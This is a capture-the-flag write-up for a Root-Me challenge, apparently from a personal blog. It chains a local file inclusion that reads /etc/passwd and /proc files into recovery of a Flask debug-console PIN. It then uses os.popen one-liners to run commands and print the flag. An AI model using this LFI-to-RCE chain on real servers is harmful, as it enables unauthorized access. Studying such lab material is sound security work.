---
layout: default
title: Flask-Development-server
---

Here I saw this interesting article [hacking flask applications](https://medium.com/swlh/hacking-flask-applications-939eae4bffed), which talks about `debug` mode which shouldn't be in production.

Saw, I went to `http://challenge01.root-me.org:59085/console`, However, we can see we need to supply PIN.

Then, I saw this article [hacking the debugging pin of flask](https://b33pl0g1c.medium.com/hacking-the-debugging-pin-of-a-flask-application-7364794c4948), which talks about how to regenerate the PIN.

This script should regenerate the PIN, however, we need to supply input that we need to achieve somehow.
```py
{% include_relative scripts/Flask-Development-server_pin_cracker.py %}
```

Then, I saw this `LFI` here: `http://challenge01.root-me.org:59085/services?search=/etc/passwd`

We need to achieve several things:
1. username of who started the flask app
2. modname of the Flask.app (it is always `flask.app`)
3. `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is `Flask`
4. the `getattr(mod, '__file__', None)` is the absolute path `app.py` in the flask directory. 
5. the MAC address of the current computer
6. the machine-id

Let's achieve them!

### 1. username of who started the flask app

when checking `/etc/passwd` we get:
```
root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin web-app:x:1000:1000:Linux User,,,:/home/web-app:/bin/ash
```
Here, we can see the Linux user: `web-app`, this is probably the user who started the app.

### 2. modname of the Flask.app (it is always `flask.app`)

Okay, this is always `flask.app`

### 3. `getattr(app ...)`

This is `Flask`

### 4. the `getattr(mod, ...)` is the absolute path `app.py` in the flask directory.

We can see from the http-headers that it uses `Python/3.11.9`

I asked chatGPT, and this is what I got:
### Global vs. User-specific installation:

- **Global installation**: When Flask is installed globally (for all users or system-wide), it would usually reside in `/usr/local/lib/pythonX.X/site-packages/` (for example, `/usr/local/lib/python3.11/site-packages/`).
  
- **User-specific installation**: If you install Flask **just for your user** (using `pip install --user flask`), it will be placed in your **user's `.local` folder** under `~/.local/lib/python3.X/site-packages/`.

  Flask can end up in the **user's directory** (`~/.local/`) if you used `--user` during installation or if you're in a virtual environment. This is why the path might not be in `/usr/local/lib/python3.X/site-packages/`.

### Virtual Environments:

- If you're using a **virtual environment**, the location of `app.py` might be in a path like: `/path/to/your/virtualenv/lib/python3.X/site-packages/flask/app.py`.

Let's try `global`:
```
/usr/local/lib/python3.11/site-packages/flask/app.py
```
And we get: `[Errno 2] No such file or directory: '/usr/local/lib/python3.11/site-packages/flask/app.py'`

Okay, let's try `.local`, ur user is `web-app`.
```
/home/web-app/.local/lib/python3.11/site-packages/flask/app.py
```

And we get the file!
So, the absolute path is:
```
/home/web-app/.local/lib/python3.11/site-packages/flask/app.py
```

### 5. the MAC address of the current computer

To get the MAC address, find out the `/proc/net/arp` device id and find the mac address by typing the `/sys/class/net/<device-id>/address`.

when typing `/proc/net/arp` we get:
```
IP address HW type Flags HW address Mask Device 172.16.0.1 0x1 0x2 02:42:40:04:82:d0 * eth0
```

So, devide id is `eth0`, and then `/sys/class/net/eth0/address` gives us the MAC address, which is:
```
02:42:ac:10:00:26
```

### 6. the machine-id

As I saw here, [werkzeug pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html):
Concatenates data from `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` with the first line of `/proc/self/cgroup` post the last slash (`/`).

This is what we got for `/proc/sys/kernel/random/boot_id`
```
ec81ef37-14b2-4201-827d-f0811d43866a
```
I asked chatGPT for common places that I can find the machine-id, This is what I got:
```
/etc/machine-id
/proc/sys/kernel/random/boot_id
```

When fetching this `/proc/self/cgroup` we got:
```
ec81ef37-14b2-4201-827d-f0811d43866a
```

## Attack

So now, let's insert all to the code, and we get this PIN:
```
754-279-725
```

Now, we can simply execute commands like this:
```py
__import__('os').popen('whoami').read()
```

So, first we want `ls -a`:
```py
__import__('os').popen('ls -a').read()
```

Then, we simply execute `cat 1b2cba8365de790bbb1e3dabcacdede935745e393288fd48f64b985cb52dad11.txt`:
```py
__import__('os').popen('cat 1b2cba8365de790bbb1e3dabcacdede935745e393288fd48f64b985cb52dad11.txt').read()
```

And getting:
`RM{B3_C4refull_w1th_fl4sk_d3bug}`

**Flag:** **_`RM{B3_C4refull_w1th_fl4sk_d3bug}`_**
